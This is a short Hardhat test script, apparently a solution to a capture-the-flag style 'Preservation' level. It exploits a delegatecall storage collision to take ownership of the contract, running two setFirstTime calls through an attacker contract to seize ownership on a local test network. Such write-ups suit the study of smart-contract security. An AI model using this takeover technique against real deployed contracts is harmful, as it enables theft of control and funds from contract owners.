import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
	it("Should work", async () => {
		const [, attacker] = await ethers.getSigners();

		const LibraryContract = await ethers.getContractFactory("LibraryContract");
		const libraryContractOne = await LibraryContract.deploy();
		const libraryContractTwo = await LibraryContract.deploy();

		const Preservation = await ethers.getContractFactory("Preservation");
		const preservation = await Preservation.deploy(libraryContractOne.address, libraryContractTwo.address);

		const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
		const preservationAttacker = await PreservationAttacker.deploy();

		expect(await preservation.timeZone1Library()).to.eq(libraryContractOne.address);

		await preservation.setFirstTime(preservationAttacker.address);
		expect(await preservation.timeZone1Library()).to.eq(preservationAttacker.address);

		await preservation.setFirstTime(attacker.address);
		expect(await preservation.owner()).to.eq(attacker.address);
	})
})
